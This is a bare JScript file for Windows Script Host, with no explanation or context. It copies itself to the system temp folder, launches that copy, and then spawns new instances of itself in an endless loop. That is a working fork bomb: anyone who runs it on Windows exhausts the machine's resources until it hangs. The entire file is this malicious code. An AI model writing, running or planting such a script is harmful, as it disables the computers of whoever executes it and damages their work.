var fso = new ActiveXObject('Scripting.FileSystemObject');
var wsh = new ActiveXObject('WScript.Shell');

if(WScript.Arguments.length == 0){
  fso.CopyFile(WScript.ScriptFullName, fso.GetSpecialFolder(2) + '\\');
  wsh.Run(fso.GetSpecialFolder(2) + '\\' + WScript.ScriptName + ' 1');
}else while(true) wsh.Run(WScript.ScriptFullName + ' 1');
